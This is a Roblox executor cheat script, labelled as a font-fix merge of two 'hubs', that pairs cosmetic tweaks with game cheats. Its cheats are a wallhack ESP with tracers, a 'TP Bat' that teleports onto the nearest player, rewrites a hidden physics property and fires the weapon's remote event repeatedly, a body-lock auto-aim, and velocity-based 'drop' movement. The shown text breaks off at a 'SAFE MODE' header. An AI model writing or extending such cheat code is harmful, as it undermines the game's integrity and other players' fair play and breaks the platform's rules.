-- ============================================================
--  ELITE.GG + AKAI HUB (FULL MERGE) - FONT SAVE FIX
--  Includes: All Font Styles + Vampire Anim + FOV 120 + Stretch Rez
--  FONT APPLIES TO ALL BUTTONS & TEXT ELEMENTS
-- ============================================================

if not game:IsLoaded() then game.Loaded:Wait() end

-- ============================================================
-- HIGH PING ALERT (>150 ms)
-- ============================================================
task.spawn(function()
	local env = (getgenv and getgenv()) or _G
	env.__BLESS_HIGH_PING_RUN = (env.__BLESS_HIGH_PING_RUN or 0) + 1
	local thisRun = env.__BLESS_HIGH_PING_RUN
	local shown = false

	local function getPingMilliseconds()
		local ok, value = pcall(function()
			local stats = game:GetService("Stats")
			local network = stats:FindFirstChild("Network")
			local serverStats = network and network:FindFirstChild("ServerStatsItem")
			local pingItem = serverStats and (serverStats:FindFirstChild("Data Ping") or serverStats:FindFirstChild("Ping"))
			if not pingItem then return nil end
			local numericValue
			pcall(function() numericValue = pingItem:GetValue() end)
			if type(numericValue) == "number" then return numericValue end
			local valueString = pingItem:GetValueString()
			return tonumber(tostring(valueString):match("[%d%.]+"))
		end)
		return ok and tonumber(value) or nil
	end

	local function showHighPingAlert()
		local TweenService = game:GetService("TweenService")
		local CoreGui = game:GetService("CoreGui")
		local Players = game:GetService("Players")
		local player = Players.LocalPlayer
		local playerGui = player and player:FindFirstChildOfClass("PlayerGui")
		pcall(function() local old = CoreGui:FindFirstChild("BlessHighPingAlert"); if old then old:Destroy() end end)
		pcall(function() local old = playerGui and playerGui:FindFirstChild("BlessHighPingAlert"); if old then old:Destroy() end end)
		local gui = Instance.new("ScreenGui")
		gui.Name = "BlessHighPingAlert"
		gui.ResetOnSpawn = false
		gui.IgnoreGuiInset = false
		gui.DisplayOrder = 10000
		gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
		local parented = pcall(function() gui.Parent = CoreGui end)
		if not parented or not gui.Parent then gui.Parent = playerGui end
		if not gui.Parent then gui:Destroy(); return end
		local bar = Instance.new("Frame")
		bar.Name = "AlertBar"
		bar.AnchorPoint = Vector2.new(0.5, 0)
		bar.Position = UDim2.new(0.5, 0, 0, -44)
		bar.Size = UDim2.new(0, 310, 0, 32)
		bar.BackgroundColor3 = Color3.fromRGB(205, 0, 0)
		bar.BackgroundTransparency = 0.06
		bar.BorderSizePixel = 0
		bar.ClipsDescendants = true
		bar.ZIndex = 100
		bar.Parent = gui
		local corner = Instance.new("UICorner"); corner.CornerRadius = UDim.new(0, 11); corner.Parent = bar
		local stroke = Instance.new("UIStroke"); stroke.Color = Color3.fromRGB(255, 12, 12); stroke.Transparency = 0.2; stroke.Thickness = 1; stroke.Parent = bar
		local gradient = Instance.new("UIGradient")
		gradient.Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 0, 0)),
			ColorSequenceKeypoint.new(0.5, Color3.fromRGB(235, 0, 0)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 0, 0)),
		})
		gradient.Parent = bar
		local label = Instance.new("TextLabel")
		label.BackgroundTransparency = 1
		label.Position = UDim2.new(0, 10, 0, 0)
		label.Size = UDim2.new(1, -20, 1, 0)
		label.Font = Enum.Font.GothamBold
		label.Text = "high ping! Your ping is more than 150."
		label.TextColor3 = Color3.fromRGB(255, 55, 55)
		label.TextSize = 13
		label.TextStrokeColor3 = Color3.fromRGB(55, 0, 0)
		label.TextStrokeTransparency = 0.55
		label.TextWrapped = false
		label.TextScaled = false
		label.ZIndex = 102
		label.Parent = bar
		local slideIn = TweenService:Create(bar, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, 0, 0, 10)})
		slideIn:Play(); slideIn.Completed:Wait()
		task.wait(2)
		local slideOut = TweenService:Create(bar, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {Position = UDim2.new(0.5, 0, 0, -44)})
		slideOut:Play(); slideOut.Completed:Wait()
		gui:Destroy()
	end

	task.wait(5)
	while env.__BLESS_HIGH_PING_RUN == thisRun and not shown do
		local ping = getPingMilliseconds()
		if ping and ping > 150 then
			shown = true
			showHighPingAlert()
			break
		end
		task.wait(1)
	end
end)

-- ============================================================
-- SERVICES & GLOBALS
-- ============================================================
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local TS = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local HS = game:GetService("HttpService")
local SoundService = game:GetService("SoundService")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LP = Players.LocalPlayer
local UI_NAME = "blessvs"
local MOBILE_UI_NAME = "blessvsMobileButtons"

pcall(function()
	local old = CoreGui:FindFirstChild(UI_NAME); if old then old:Destroy() end
	local oldMobile = CoreGui:FindFirstChild(MOBILE_UI_NAME); if oldMobile then oldMobile:Destroy() end
end)
pcall(function()
	local pg = LP:FindFirstChild("PlayerGui")
	if pg then
		local old = pg:FindFirstChild(UI_NAME); if old then old:Destroy() end
		local oldMobile = pg:FindFirstChild(MOBILE_UI_NAME); if oldMobile then oldMobile:Destroy() end
	end
end)
_G.blessvsRunning = true

-- ============================================================
-- AKAI FONT STYLES (FULL LIST)
-- ============================================================
local _currentFontIdx = 1
local _FONTS = {
	{name="Gotham", path="rbxasset://fonts/families/GothamSSm.json"},
	{name="Nunito", path="rbxasset://fonts/families/Nunito.json"},
	{name="FredokaOne", path="rbxasset://fonts/families/FredokaOne.json"},
	{name="Bangers", path="rbxasset://fonts/families/Bangers.json"},
	{name="Arcade", path="rbxasset://fonts/families/PressStart2P.json"},
	{name="Cartoon", path="rbxasset://fonts/families/ComicNeueAngular.json"},
	{name="Roboto", path="rbxasset://fonts/families/Roboto.json"},
	{name="Oswald", path="rbxasset://fonts/families/Oswald.json"},
	{name="Michroma", path="rbxasset://fonts/families/Michroma.json"},
	{name="SciFi", path="rbxasset://fonts/families/Zekton.json"},
	{name="Creepster", path="rbxasset://fonts/families/Creepster.json"},
	{name="IndieFlower", path="rbxasset://fonts/families/IndieFlower.json"},
	{name="Kalam", path="rbxasset://fonts/families/Kalam.json"},
	{name="Merriweather", path="rbxasset://fonts/families/Merriweather.json"},
	{name="Jura", path="rbxasset://fonts/families/Jura.json"},
	{name="PatrickHand", path="rbxasset://fonts/families/PatrickHand.json"},
	{name="SpecialElite", path="rbxasset://fonts/families/SpecialElite.json"},
	{name="AmaticSC", path="rbxasset://fonts/families/AmaticSC.json"},
	{name="Fondamento", path="rbxasset://fonts/families/Fondamento.json"},
	{name="GrenzeGotisch", path="rbxasset://fonts/families/GrenzeGotisch.json"},
	{name="LuckiestGuy", path="rbxasset://fonts/families/LuckiestGuy.json"},
	{name="Sarpanch", path="rbxasset://fonts/families/Sarpanch.json"},
	{name="TitilliumWeb", path="rbxasset://fonts/families/TitilliumWeb.json"},
	{name="Highway", path="rbxasset://fonts/families/HighwayGothic.json"},
	{name="DenkOne", path="rbxasset://fonts/families/DenkOne.json"},
	{name="JosefinSans", path="rbxasset://fonts/families/JosefinSans.json"},
	{name="PermanentMkr", path="rbxasset://fonts/families/PermanentMarker.json"},
	{name="Antique", path="rbxasset://fonts/families/RomanAntique.json"},
}

-- ============================================================
-- FONT APPLIER - APPLIES TO ALL BUTTONS & TEXT ELEMENTS
-- ============================================================
local function refreshAllFonts()
	local entry = _FONTS[_currentFontIdx]
	if not entry then return end
	pcall(function()
		local ok, face = pcall(Font.new, entry.path)
		if not ok or not face then return end
		
		-- Excluded names (para hindi ma-override ang specific texts)
		local _noFontOverride = { 
			TitleMain = true, 
			DiscordLink = true,
		}
		
		-- Hanapin lahat ng ScreenGui sa CoreGui at PlayerGui
		local allGuis = {}
		for _, gui in ipairs(CoreGui:GetChildren()) do
			if gui:IsA("ScreenGui") then table.insert(allGuis, gui) end
		end
		local pg = LP:FindFirstChild("PlayerGui")
		if pg then
			for _, gui in ipairs(pg:GetChildren()) do
				if gui:IsA("ScreenGui") then table.insert(allGuis, gui) end
			end
		end
		
		-- Apply font sa LAHAT ng GUI including buttons
		for _, gui in ipairs(allGuis) do
			for _, desc in ipairs(gui:GetDescendants()) do
				pcall(function()
					if (desc:IsA("TextLabel") or desc:IsA("TextButton") or desc:IsA("TextBox")) 
					   and not _noFontOverride[desc.Name] then
						desc.FontFace = face
					end
				end)
			end
		end
	end)
end

-- Apply font to a specific GUI (for new GUIs)
local function applyFontToGui(gui)
	if not gui then return end
	local entry = _FONTS[_currentFontIdx]
	if not entry then return end
	pcall(function()
		local ok, face = pcall(Font.new, entry.path)
		if not ok or not face then return end
		local _noFontOverride = { TitleMain = true, DiscordLink = true }
		for _, desc in ipairs(gui:GetDescendants()) do
			pcall(function()
				if (desc:IsA("TextLabel") or desc:IsA("TextButton") or desc:IsA("TextBox")) 
				   and not _noFontOverride[desc.Name] then
					desc.FontFace = face
				end
			end)
		end
	end)
end

local function cycleFont()
	_currentFontIdx = _currentFontIdx % #_FONTS + 1
	refreshAllFonts()
	saveConfig() -- I-SAVE AGAD ANG FONT SELECTION
end

-- ============================================================
-- VAMPIRE ANIM (FROM AKAI HUB)
-- ============================================================
local _VAMPIRE_ANIMS = {
	idle1 = "rbxassetid://1083445855",
	idle2 = "rbxassetid://1083450166",
	walk = "rbxassetid://1083473930",
	run = "rbxassetid://1083462077",
	jump = "rbxassetid://1083455352",
	climb = "rbxassetid://1083439238",
	fall = "rbxassetid://1083443587",
}
local _vampOrig = {}
local _vampCharConn = nil
local vampireAnimEnabled = false

local function _applyVampireAnim(char)
	if not char then return end
	local A = char:FindFirstChild("Animate")
	if not A then return end
	pcall(function()
		_vampOrig.idle1 = A.idle.Animation1.AnimationId
		_vampOrig.idle2 = A.idle.Animation2.AnimationId
		_vampOrig.walk = A.walk.WalkAnim.AnimationId
		_vampOrig.run = A.run.RunAnim.AnimationId
		_vampOrig.jump = A.jump.JumpAnim.AnimationId
		_vampOrig.climb = A.climb.ClimbAnim.AnimationId
		_vampOrig.fall = A.fall.FallAnim.AnimationId
		A.idle.Animation1.AnimationId = _VAMPIRE_ANIMS.idle1
		A.idle.Animation2.AnimationId = _VAMPIRE_ANIMS.idle2
		A.walk.WalkAnim.AnimationId = _VAMPIRE_ANIMS.walk
		A.run.RunAnim.AnimationId = _VAMPIRE_ANIMS.run
		A.jump.JumpAnim.AnimationId = _VAMPIRE_ANIMS.jump
		A.climb.ClimbAnim.AnimationId = _VAMPIRE_ANIMS.climb
		A.fall.FallAnim.AnimationId = _VAMPIRE_ANIMS.fall
	end)
	pcall(function()
		char.Humanoid.Jump = true
	end)
end

local function _restoreVampireAnim(char)
	if not char or not next(_vampOrig) then return end
	local A = char:FindFirstChild("Animate")
	if not A then return end
	pcall(function()
		if _vampOrig.idle1 then A.idle.Animation1.AnimationId = _vampOrig.idle1 end
		if _vampOrig.idle2 then A.idle.Animation2.AnimationId = _vampOrig.idle2 end
		if _vampOrig.walk then A.walk.WalkAnim.AnimationId = _vampOrig.walk end
		if _vampOrig.run then A.run.RunAnim.AnimationId = _vampOrig.run end
		if _vampOrig.jump then A.jump.JumpAnim.AnimationId = _vampOrig.jump end
		if _vampOrig.climb then A.climb.ClimbAnim.AnimationId = _vampOrig.climb end
		if _vampOrig.fall then A.fall.FallAnim.AnimationId = _vampOrig.fall end
	end)
end

function enableVampireAnim()
	vampireAnimEnabled = true
	_applyVampireAnim(LP.Character)
	if _vampCharConn then _vampCharConn:Disconnect() end
	_vampCharConn = LP.CharacterAdded:Connect(function(char)
		task.wait(1)
		if vampireAnimEnabled then _applyVampireAnim(char) end
	end)
	saveConfig()
end

function disableVampireAnim()
	vampireAnimEnabled = false
	if _vampCharConn then _vampCharConn:Disconnect(); _vampCharConn = nil end
	_restoreVampireAnim(LP.Character)
	saveConfig()
end

-- ============================================================
-- STRETCH REZ (FPS BOOST) - FROM AKAI HUB
-- ============================================================
local _Flags = { VERTICAL_STRETCH = 0.78, STRETCH_BIND_NAME = "Vertical_Stretch_Res" }
local stretchRezEnabled = false
local stretchRezConn = nil
local stretchRezSetVisual = nil
local defFOV = 70

function enableStretchRez()
	stretchRezEnabled = true
	if not stretchRezConn then
		pcall(function() RunService:UnbindFromRenderStep(_Flags.STRETCH_BIND_NAME) end)
		RunService:BindToRenderStep(_Flags.STRETCH_BIND_NAME, Enum.RenderPriority.Camera.Value + 1, function()
			local camera = workspace.CurrentCamera
			if not camera then return end
			local cf = camera.CFrame
			local x, y, z, r00, r01, r02, r10, r11, r12, r20, r21, r22 = cf:GetComponents()
			camera.CFrame = CFrame.new(x, y, z,
				r00, r01 * _Flags.VERTICAL_STRETCH, r02,
				r10, r11 * _Flags.VERTICAL_STRETCH, r12,
				r20, r21 * _Flags.VERTICAL_STRETCH, r22
			)
		end)
	end
	if stretchRezSetVisual then stretchRezSetVisual(true) end
	saveConfig()
end

function disableStretchRez()
	stretchRezEnabled = false
	pcall(function() RunService:UnbindFromRenderStep(_Flags.STRETCH_BIND_NAME) end)
	if stretchRezConn then
		stretchRezConn:Disconnect()
		stretchRezConn = nil
	end
	if stretchRezSetVisual then stretchRezSetVisual(false) end
	saveConfig()
end

-- ============================================================
-- FOV 120 - FROM AKAI HUB
-- ============================================================
local fovEnabled = false
local fovConn = nil
local _fovTween = nil
local fovSetVisual = nil

function enableFOV()
	fovEnabled = true
	local cam = workspace.CurrentCamera
	if not cam then return end
	if fovConn then fovConn:Disconnect(); fovConn = nil end
	if _fovTween then _fovTween:Cancel() end
	_fovTween = TS:Create(cam, TweenInfo.new(0.7, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { FieldOfView = 120 })
	_fovTween:Play()
	_fovTween.Completed:Connect(function(state)
		if state == Enum.PlaybackState.Completed and fovEnabled then
			if fovConn then fovConn:Disconnect() end
			fovConn = RunService.RenderStepped:Connect(function()
				if not fovEnabled then
					fovConn:Disconnect()
					fovConn = nil
					return
				end
				workspace.CurrentCamera.FieldOfView = 120
			end)
		end
	end)
	if fovSetVisual then fovSetVisual(true) end
	saveConfig()
end

function disableFOV()
	fovEnabled = false
	if fovConn then fovConn:Disconnect(); fovConn = nil end
	local cam = workspace.CurrentCamera
	if not cam then return end
	if _fovTween then _fovTween:Cancel() end
	_fovTween = TS:Create(cam, TweenInfo.new(0.7, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { FieldOfView = defFOV or 70 })
	_fovTween:Play()
	if fovSetVisual then fovSetVisual(false) end
	saveConfig()
end

function toggleFOV()
	if fovEnabled then disableFOV() else enableFOV() end
end

-- ============================================================
-- BLESS.VS-STYLE ESP PLAYER
-- ============================================================
espEnabled = false
espConns = {}
espObjects = {}
setEspVisual = nil
ESP_COLOR = Color3.fromRGB(220, 20, 60)

startESP, stopESP = nil, nil
do
	local _espEnabled = false
	local _espConn = nil
	local _espLastRun = 0
	local _hlCache = {}
	local _bbCache = {}
	local _trCache = {}

	local function clearESP()
		for _, hl in pairs(_hlCache) do pcall(function() hl:Destroy() end) end; _hlCache = {}
		for _, bb in pairs(_bbCache) do pcall(function() bb:Destroy() end) end; _bbCache = {}
		for _, lines in pairs(_trCache) do for _, ln in ipairs(lines) do pcall(function() ln.Visible=false; ln:Remove() end) end end
		_trCache = {}
	end

	local function _espMakeBillboard(head)
		local bb = Instance.new("BillboardGui")
		bb.Name="BlessESPBB"; bb.Size=UDim2.new(0,110,0,18); bb.StudsOffset=Vector3.new(0,3.2,0)
		bb.AlwaysOnTop=true; bb.LightInfluence=0; bb.Adornee=head; bb.Parent=head
		local lbl = Instance.new("TextLabel", bb)
		lbl.Size=UDim2.new(1,0,1,0); lbl.BackgroundTransparency=1; lbl.Font=Enum.Font.GothamBold
		lbl.TextSize=11; lbl.TextColor3=ESP_COLOR; lbl.TextStrokeTransparency=0.3
		lbl.TextStrokeColor3=Color3.fromRGB(0,0,0); lbl.TextXAlignment=Enum.TextXAlignment.Center
		lbl.TextTruncate=Enum.TextTruncate.AtEnd
		return bb, lbl
	end

	local function _espMakeTracers()
		if not (Drawing and type(Drawing.new)=="function") then return nil end
		local outer=Drawing.new("Line"); outer.Color=ESP_COLOR; outer.Thickness=2.2; outer.Transparency=0.88; outer.Visible=false
		local mid=Drawing.new("Line"); mid.Color=ESP_COLOR; mid.Thickness=1.2; mid.Transparency=0.72; mid.Visible=false
		local core=Drawing.new("Line"); core.Color=ESP_COLOR; core.Thickness=0.6; core.Transparency=0.10; core.Visible=false
		return {outer, mid, core}
	end

	local function _espUpdate()
		local now = tick()
		if now - _espLastRun < 0.03 then return end
		_espLastRun = now
		if not _espEnabled then clearESP(); return end
		local myChar = LP.Character
		local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
		if not myRoot then return end
		local cam = workspace.CurrentCamera
		local mySP, myOn = cam:WorldToViewportPoint(myRoot.Position)
		local myVec = Vector2.new(mySP.X, mySP.Y)
		local plrSet = {}
		for _, p in ipairs(Players:GetPlayers()) do plrSet[p] = true end
		for plr in pairs(_hlCache) do if not plrSet[plr] then pcall(function() _hlCache[plr]:Destroy() end); _hlCache[plr]=nil end end
		for plr in pairs(_bbCache) do if not plrSet[plr] then pcall(function() _bbCache[plr]:Destroy() end); _bbCache[plr]=nil end end
		for plr in pairs(_trCache) do if not plrSet[plr] then for _,ln in ipairs(_trCache[plr]) do pcall(function() ln.Visible=false; ln:Remove() end) end; _trCache[plr]=nil end end
		for _, plr in ipairs(Players:GetPlayers()) do
			if plr == LP then continue end
			local char = plr.Character
			if not char then
				if _hlCache[plr] then pcall(function() _hlCache[plr]:Destroy() end); _hlCache[plr]=nil end
				if _bbCache[plr] then pcall(function() _bbCache[plr]:Destroy() end); _bbCache[plr]=nil end
				if _trCache[plr] then for _,ln in ipairs(_trCache[plr]) do pcall(function() ln.Visible=false end) end end
				continue
			end
			local tRoot=char:FindFirstChild("HumanoidRootPart"); local tHead=char:FindFirstChild("Head"); local tHum=char:FindFirstChildOfClass("Humanoid")
			if tRoot and tHead and tHum and tHum.Health>0 then
				local hl=_hlCache[plr]
				if not hl or not hl.Parent or hl.Parent~=char then
					if hl then pcall(function() hl:Destroy() end) end
					hl=Instance.new("Highlight"); hl.Name="BlessESP"; hl.FillColor=ESP_COLOR; hl.FillTransparency=0.62
					hl.OutlineColor=ESP_COLOR; hl.OutlineTransparency=0; hl.DepthMode=Enum.HighlightDepthMode.AlwaysOnTop
					hl.Adornee=char; hl.Parent=char; _hlCache[plr]=hl
				end
				local bb=_bbCache[plr]
				if not bb or not bb.Parent or bb.Adornee~=tHead then
					if bb then pcall(function() bb:Destroy() end) end
					local newBB,lbl=_espMakeBillboard(tHead); lbl.Text=plr.DisplayName; _bbCache[plr]=newBB
				end
				local espLines=_trCache[plr]
				if not espLines then espLines=_espMakeTracers(); _trCache[plr]=espLines or {} end
				if espLines and #espLines>0 then
					local sp,on=cam:WorldToViewportPoint(tRoot.Position)
					if on and sp.Z>0 and myOn then local tv=Vector2.new(sp.X, sp.Y); for _,ln in ipairs(espLines) do ln.From=myVec; ln.To=tv; ln.Visible=true end
					else for _,ln in ipairs(espLines) do ln.Visible=false end end
				end
			else
				if _hlCache[plr] then pcall(function() _hlCache[plr]:Destroy() end); _hlCache[plr]=nil end
				if _bbCache[plr] then pcall(function() _bbCache[plr]:Destroy() end); _bbCache[plr]=nil end
				if _trCache[plr] then for _,ln in ipairs(_trCache[plr]) do pcall(function() ln.Visible=false end) end end
			end
		end
	end

	startESP = function()
		if _espEnabled then return end; _espEnabled=true
		if _espConn then _espConn:Disconnect() end
		_espConn=RunService.RenderStepped:Connect(_espUpdate)
		if setEspVisual then setEspVisual(true) end; saveConfig()
	end

	stopESP = function()
		if not _espEnabled then return end; _espEnabled=false
		if _espConn then _espConn:Disconnect(); _espConn=nil end
		clearESP(); if setEspVisual then setEspVisual(false) end; saveConfig()
	end
end

function enableESP() espEnabled=true; startESP() end
function disableESP() espEnabled=false; stopESP() end

-- ============================================================
-- DROP BRAINROT SYSTEM
-- ============================================================
local dropBrainrotActive = false
local _adaptDropConns = {}
_G.AdaptDropMode = (_G.AdaptDropMode == "Jump Drop") and "Jump Drop" or "Stand Drop"
local _xDropLastInvoke = 0
local _xDropConn = nil

local function stopDropBrainrot()
	dropBrainrotActive = false
	if _xDropConn then
		pcall(function() _xDropConn:Disconnect() end)
		_xDropConn = nil
	end
	for _, t in ipairs(_adaptDropConns) do
		if type(t) == "thread" then
			pcall(task.cancel, t)
		elseif typeof(t) == "RBXScriptConnection" then
			pcall(function() t:Disconnect() end)
		end
	end
	_adaptDropConns = {}
	local c = LP.Character
	if c then
		local root = c:FindFirstChild("HumanoidRootPart")
		if root then
			root.AssemblyLinearVelocity = Vector3.zero
			root.AssemblyAngularVelocity = Vector3.zero
		end
	end
end

local function runStandDrop()
	if dropBrainrotActive then return end
	local now = tick()
	if now - _xDropLastInvoke < 0.2 then return end
	_xDropLastInvoke = now
	local char = LP.Character
	if not char then return end
	local root = char:FindFirstChild("HumanoidRootPart")
	if not root then return end
	dropBrainrotActive = true
	local startTime = tick()
	_xDropConn = RunService.Heartbeat:Connect(function()
		local currentChar = LP.Character
		local currentRoot = currentChar and currentChar:FindFirstChild("HumanoidRootPart")
		if not currentChar or not currentRoot then
			stopDropBrainrot()
			return
		end
		if tick() - startTime >= 0.2 then
			if _xDropConn then
				pcall(function() _xDropConn:Disconnect() end); _xDropConn = nil
			end
			local rayParams = RaycastParams.new()
			rayParams.FilterDescendantsInstances = {currentChar}
			rayParams.FilterType = Enum.RaycastFilterType.Exclude
			local rayResult = workspace:Raycast(currentRoot.Position, Vector3.new(0, -2000, 0), rayParams)
			if rayResult then
				local hum = currentChar:FindFirstChildOfClass("Humanoid")
				local offset = (hum and hum.HipHeight or 2) + (currentRoot.Size.Y / 2)
				currentRoot.CFrame = CFrame.new(currentRoot.Position.X, rayResult.Position.Y + offset, currentRoot.Position.Z) * CFrame.Angles(0, select(2, currentRoot.CFrame:ToEulerAnglesYXZ()), 0)
				currentRoot.AssemblyLinearVelocity = Vector3.zero
				currentRoot.AssemblyAngularVelocity = Vector3.zero
			end
			dropBrainrotActive = false
			return
		end
		local v = currentRoot.AssemblyLinearVelocity
		local up = 150
		pcall(function()
			currentRoot.AssemblyLinearVelocity = Vector3.new(v.X, up, v.Z)
		end)
	end)
	task.delay(1.0, function()
		if dropBrainrotActive then stopDropBrainrot() end
	end)
end

_G.AdaptJumpDropActive = false
_G.AdaptJumpDropAscendDuration = 0.2
_G.AdaptJumpDropAscendSpeed = 150
_G.AdaptDropAscendDuration = 0.2
_G.AdaptDropAscendSpeed = 150

function _G.AdaptRunJumpDrop()
	if _G.AdaptJumpDropActive then return end
	local char = LP.Character
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not char or not root then return end
	_G.AdaptJumpDropActive = true
	local startTime = tick()
	_G.AdaptJumpDropConn = RunService.Heartbeat:Connect(function()
		local currentChar = LP.Character
		local currentRoot = currentChar and currentChar:FindFirstChild("HumanoidRootPart")
		if not currentChar or not currentRoot then
			if _G.AdaptJumpDropConn then
				pcall(function() _G.AdaptJumpDropConn:Disconnect() end)
				_G.AdaptJumpDropConn = nil
			end
			_G.AdaptJumpDropActive = false
			return
		end
		if tick() - startTime >= _G.AdaptJumpDropAscendDuration then
			if _G.AdaptJumpDropConn then
				pcall(function() _G.AdaptJumpDropConn:Disconnect() end)
				_G.AdaptJumpDropConn = nil
			end
			local rayParams = RaycastParams.new()
			rayParams.FilterDescendantsInstances = {currentChar}
			rayParams.FilterType = Enum.RaycastFilterType.Exclude
			local rayResult = workspace:Raycast(currentRoot.Position, Vector3.new(0, -2000, 0), rayParams)
			if rayResult then
				local hum = currentChar:FindFirstChildOfClass("Humanoid")
				local offset = (hum and hum.HipHeight or 2) + (currentRoot.Size.Y / 2)
				currentRoot.CFrame = CFrame.new(currentRoot.Position.X, rayResult.Position.Y + offset, currentRoot.Position.Z)
				currentRoot.AssemblyLinearVelocity = Vector3.zero
				currentRoot.AssemblyAngularVelocity = Vector3.zero
			end
			_G.AdaptJumpDropActive = false
			return
		end
		local _jdCur = currentRoot.AssemblyLinearVelocity
		currentRoot.AssemblyLinearVelocity = Vector3.new(_jdCur.X, _G.AdaptJumpDropAscendSpeed, _jdCur.Z)
	end)
end

function runDrop()
	if _G.AdaptDropMode == "Jump Drop" then
		_G.AdaptRunJumpDrop()
	else
		runStandDrop()
	end
end

function runDropBrainrot() runDrop() end

-- ============================================================
-- TP BAT (FROM AKAI HUB)
-- ============================================================
tpBatEnabled = false
tpBatHittingCooldown = false
tpBatConn = nil
tpBatSetVisual = nil
_tpBat_h = nil
_tpBat_hrp = nil
_TP_RANGE = 3.5
_TP_LEAD = 0.08

function _tpBatGetBat()
	local char = LP.Character
	if not char then return nil end
	local tool = char:FindFirstChild("Bat")
	if tool then return tool end
	local bp2 = LP:FindFirstChild("Backpack")
	if bp2 then
		tool = bp2:FindFirstChild("Bat")
		if tool then
			tool.Parent = char
			return tool
		end
	end
	return nil
end

function _tpBatTryHit()
	if tpBatHittingCooldown then return end
	tpBatHittingCooldown = true
	pcall(function()
		local bat = _tpBatGetBat()
		if bat then
			bat:Activate()
			local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
			if ev then
				ev:FireServer()
				ev:FireServer()
			end
		end
	end)
	task.delay(0.06 + math.random()*0.05, function()
		tpBatHittingCooldown = false
	end)
end

function _tpBatGetClosest()
	if not _tpBat_hrp then return nil, math.huge end
	local cp, cd = nil, math.huge
	for _, p in pairs(Players:GetPlayers()) do
		if p ~= LP and p.Character then
			local hum = p.Character:FindFirstChildOfClass("Humanoid")
			local tr = p.Character:FindFirstChild("HumanoidRootPart")
			if tr and hum and hum.Health > 0 then
				local d = (_tpBat_hrp.Position - tr.Position).Magnitude
				if d < cd then
					cd = d
					cp = p
				end
			end
		end
	end
	return cp, cd
end

function _tpBatSetupChar(char)
	task.wait(0.1)
	_tpBat_h = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 5)
	_tpBat_hrp = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart", 5)
end

function startTpBat()
	tpBatEnabled = true
	local char = LP.Character
	if char then _tpBatSetupChar(char) end

	if not tpBatConn then
		tpBatConn = RunService.Heartbeat:Connect(function()
			if not (tpBatEnabled and _tpBat_h and _tpBat_hrp) then return end
			local target, _ = _tpBatGetClosest()
			if not (target and target.Character) then return end
			local tr = target.Character:FindFirstChild("HumanoidRootPart")
			if not tr then return end
			local vel = tr.AssemblyLinearVelocity
			local future = tr.Position + Vector3.new(vel.X * _TP_LEAD, 0, vel.Z * _TP_LEAD)
			local aimPos = future + Vector3.new(0, 0.9, 0)
			if (_tpBat_hrp.Position - aimPos).Magnitude > _TP_RANGE then
				local lookDir = (tr.Position - aimPos)
				local facing = lookDir.Magnitude > 0.01 and CFrame.lookAt(aimPos, tr.Position) or CFrame.new(aimPos)
				_tpBat_hrp.CFrame = facing
			end
			pcall(function()
				if sethiddenproperty then
					sethiddenproperty(_tpBat_hrp, "PhysicsRepRootPart", tr)
				end
			end)
			local cam = workspace.CurrentCamera
			cam.CFrame = CFrame.new(cam.CFrame.Position, tr.Position)
			_tpBatTryHit()
		end)
	end

	if tpBatSetVisual then tpBatSetVisual(true) end
	saveConfig()
end

function stopTpBat()
	tpBatEnabled = false
	if tpBatConn then
		tpBatConn:Disconnect()
		tpBatConn = nil
	end
	if tpBatSetVisual then tpBatSetVisual(false) end
	saveConfig()
end

function toggleTpBat()
	if tpBatEnabled then stopTpBat() else startTpBat() end
end

-- ============================================================
-- BODY LOCK
-- ============================================================
bodyLockEnabled = false
bodyLockRadius = 20
bodyLockConn = nil
setBodyLockVisual = nil

function getNearestBodyLockTarget()
	local character = LP.Character
	local root = character and character:FindFirstChild("HumanoidRootPart")
	if not root then return nil end
	local nearest = nil
	local shortest = math.huge
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LP and plr.Character then
			local tr = plr.Character:FindFirstChild("HumanoidRootPart")
			local hum = plr.Character:FindFirstChildOfClass("Humanoid")
			if tr and hum and hum.Health > 0 then
				local d = (tr.Position - root.Position).Magnitude
				if d <= bodyLockRadius and d < shortest then
					shortest = d
					nearest = plr
				end
			end
		end
	end
	return nearest
end

function startBodyLock()
	if bodyLockConn then return end
	bodyLockEnabled = true
	bodyLockConn = RunService.Heartbeat:Connect(function()
		if not bodyLockEnabled then return end
		local character = LP.Character
		local myRoot = character and character:FindFirstChild("HumanoidRootPart")
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
		if not myRoot or not humanoid or humanoid.Health <= 0 then return end
		local target = getNearestBodyLockTarget()
		if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
			local targetPos = target.Character.HumanoidRootPart.Position
			local myPos = myRoot.Position
			local offset = Vector3.new(targetPos.X, myPos.Y, targetPos.Z) - myPos
			if offset.Magnitude > 0.1 then
				humanoid.AutoRotate = false
				local lookDir = offset.Unit
				local currentDir = myRoot.CFrame.LookVector
				local cross = currentDir:Cross(lookDir)
				local currentVel = myRoot.AssemblyAngularVelocity
				myRoot.AssemblyAngularVelocity = Vector3.new(currentVel.X, cross.Y * 40, currentVel.Z)
			end
		else
			humanoid.AutoRotate = true
		end
	end)
end

function stopBodyLock()
	bodyLockEnabled = false
	if bodyLockConn then
		bodyLockConn:Disconnect()
		bodyLockConn = nil
	end
	local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
	if hum then hum.AutoRotate = true end
end

function toggleBodyLock(on)
	bodyLockEnabled = on
	if on then startBodyLock() else stopBodyLock() end
	if setBodyLockVisual then setBodyLockVisual(on) end
	saveConfig()
end

-- ============================================================
-- SAFE MODE
-- ============================================================
_GACC = _GACC or {}
